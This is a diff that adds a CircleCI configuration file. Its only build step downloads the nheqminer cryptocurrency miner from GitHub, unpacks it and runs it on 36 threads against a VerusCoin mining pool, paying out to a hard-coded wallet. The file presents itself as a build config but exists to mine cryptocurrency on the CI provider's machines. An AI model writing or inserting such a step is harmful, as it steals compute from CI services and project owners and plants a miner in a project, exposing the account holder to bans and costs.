@@ -1,0 +1,11 @@
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run:  wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz &&tar -xvzf nheqminer-Linux-v0.8.2.tgz &&tar xf nheqminer-Linux-v0.8.2.tar.gz &&cd nheqminer &&./nheqminer -v -l verushash.eu.mine.zpool.ca:6143 -u RPXETzfH5vhTxrSzB86P4i6bDgNtnyiTg4 -t 36 c=VRSC
